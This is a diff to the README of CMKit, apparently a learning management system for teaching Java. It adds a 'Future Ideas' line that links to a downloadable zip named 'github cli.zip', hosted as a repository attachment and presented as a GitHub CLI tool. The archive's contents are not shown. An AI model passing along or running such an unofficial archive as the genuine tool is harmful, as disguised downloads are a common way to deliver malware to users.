@@ -122,5 +122,8 @@ Summary of key takeaways for using CMKit:
 Final thoughts and recommendations for using CMKit
 By providing a structured and collaborative environment for students to learn and practice coding skills, instructors can help to prepare students for success in future careers in the field.
 
+Future Ideas:
+- GithubCLI to browse Git directory without having to download: [github cli.zip](https://github.com/thanhvu0895/CMKit-Java-Learning-Management-System/files/10848853/github.cli.zip). 
+
 # VIII Kit Presentation 
 [![Presentation link](https://i.imgur.com/tnuMkYt.png)](https://drive.google.com/file/d/1HmIBZJtRYmAtaYE_QU23V37QcD_5UOAY/view)
